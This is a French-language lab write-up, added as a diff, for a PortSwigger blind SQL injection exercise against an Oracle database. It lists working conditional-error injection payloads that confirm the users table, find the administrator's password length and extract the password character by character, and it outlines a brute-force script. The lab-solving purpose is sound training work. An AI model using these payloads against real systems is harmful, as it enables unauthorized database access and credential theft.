@@ -1,0 +1,47 @@
+#Blind SQL injection with conditional errors
+
+_______________________________________________________
+
+#Objectif : Ce laboratoire contient une vulnérabilité d'injection SQL aveugle. L'application utilise un cookie de suivi pour l'analyse, et effectue une requête SQL contenant la valeur du cookie soumis.
+
+Les résultats de la requête SQL ne sont pas retournés, et l'application ne répond pas différemment en fonction de la question si la requête retourne des lignes. Si la requête SQL provoque une erreur, l'application retourne un message d'erreur personnalisé.
+
+La base de données contient un tableau différent appelé users, avec des colonnes appelées usernameet password. Vous devez exploiter la vulnérabilité d'injection SQL aveugle pour trouver le mot de passe du administratorl'utilisateur.
+
+Pour résoudre le laboratoire, connectez-vous comme le administrator l'utilisateur.
+
+_______________________________________________________
+
+#Analyse et resolution : 
+
+Essayer les conditionals requests de la cheat sheet de portswigger 
+
+Nous sommes en face d'une base de donne de type Oracle (jai fait le test avec sqlmap): ' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
+
+Cela nous confirme que la table users existe :  ' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE rownum=1)='a
+
+Cela nous confirme que l'utilisateur administrator existe dans la table users  :  ' AND (SELECT CASE WHEN ((SELECT username FROM users WHERE username='administrator')!='administrator') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
+
+Cela nous confirme que la taille du mot de passe de l'administrator est de 20 caractère   :  ' AND (SELECT CASE WHEN ((SELECT LENGTH(password) FROM users WHERE username='administrator')!=20) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
+
+Trouver le mot de passe de l'administrateur caractère par caractère : ' AND (SELECT CASE WHEN ((SELECT (SUBSTR(password,1,1)) FROM users WHERE username='administrator')!='i') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
+
+En itterant les positions on trouve le mot de passe suivant : : iub4ykoezrkkio3pjt0l 
+
+
+_______________________________________________________
+
+
+#Analyse pour Ecriture du Script python 
+
+0- Initialiser une session et lutiliser pour le reste du script 
+
+1- Recuperer le cookies
+
+2- Injecter le payload dans le tracking id contenu dans le cookies pour recuperer la taille du mot de passe
+
+3- Faire la force brute pour recuperer le mot de passe 
+
+4- Recuperer le csrf 
+
+5- Sur la page login se connecter pour solve le lab 
